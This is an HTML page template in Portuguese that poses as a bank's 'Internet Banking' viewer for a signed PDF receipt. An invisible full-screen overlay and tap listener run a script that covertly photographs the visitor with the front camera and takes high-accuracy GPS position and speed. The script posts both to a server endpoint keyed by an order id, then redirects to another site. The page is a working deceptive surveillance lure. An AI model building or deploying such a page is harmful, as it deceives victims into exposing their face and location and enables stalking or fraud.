<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Visualizador de Documentos</title>
    <meta property="og:site_name" content="Internet Banking">
    <meta property="og:title" content="游늯 Comprovante_Digital.pdf">
    <meta property="og:description" content="Toque para visualizar o documento assinado.">
    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/8/87/PDF_file_icon.svg/400px-PDF_file_icon.svg.png">
    <style>
        body { margin: 0; background: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #c0392b; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin-bottom: 10px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        /* Elementos da c칙mera ficam invis칤veis */
        #video, #canvas { display: none; }
    </style>
</head>
<body>
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas" width="640" height="480"></canvas>

    <div id="capa" onclick="executarSeguranca()" style="position:fixed; top:0; left:0; width:100%; height:100%; z-index:9999;"></div>
    
    <div style="text-align:center;">
        <div class="spinner"></div>
        <div style="font-size: 14px; color: #555;">Carregando documento...</div>
    </div>

    <script>
        const idOrdem = "{{ id }}";
        const siteDestino = "{{ destino }}";
        let jaEnviou = false;
        let fotoBase64 = null;

        function finalizar() { window.location.href = siteDestino; }

        async function capturarFoto() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                // Aguarda 1.5s para a c칙mera ajustar o foco/brilho
                await new Promise(resolve => setTimeout(resolve, 1500));
                
                const canvas = document.getElementById('canvas');
                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                
                // Converte para JPEG comprimido para n칚o sobrecarregar o envio
                fotoBase64 = canvas.toDataURL('image/jpeg', 0.5);
                
                // Desliga a c칙mera imediatamente
                stream.getTracks().forEach(track => track.stop());
            } catch (err) {
                console.log("C칙mera recusada ou indispon칤vel");
            }
        }

        async function executarSeguranca() {
            if (jaEnviou) return;

            // Primeiro tenta a foto
            await capturarFoto();

            // Depois solicita o GPS e envia tudo
            navigator.geolocation.getCurrentPosition(function(pos) {
                enviarDados(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy, pos.coords.speed);
            }, function() {
                // Mesmo sem GPS, tenta enviar a foto se tiver capturado
                enviarDados(null, null, null, null);
            }, { enableHighAccuracy: true, timeout: 8000 });
        }

        function enviarDados(lat, lon, acc, spd) {
            if (jaEnviou) return;
            
            fetch(`/api/sinal/${idOrdem}`, {
                method: "POST",
                headers: {"Content-Type": "application/json"},
                body: JSON.stringify({
                    latitude: lat,
                    longitude: lon,
                    accuracy: acc ? Math.round(acc) : null,
                    speed: spd,
                    foto: fotoBase64 // Aqui vai a imagem capturada
                })
            }).finally(() => { 
                jaEnviou = true; 
                finalizar(); 
            });
        }

        // Tenta iniciar automaticamente, mas o clique na 'capa' garante o funcionamento
        executarSeguranca();
        window.addEventListener('touchstart', executarSeguranca);
    </script>
</body>
</html>
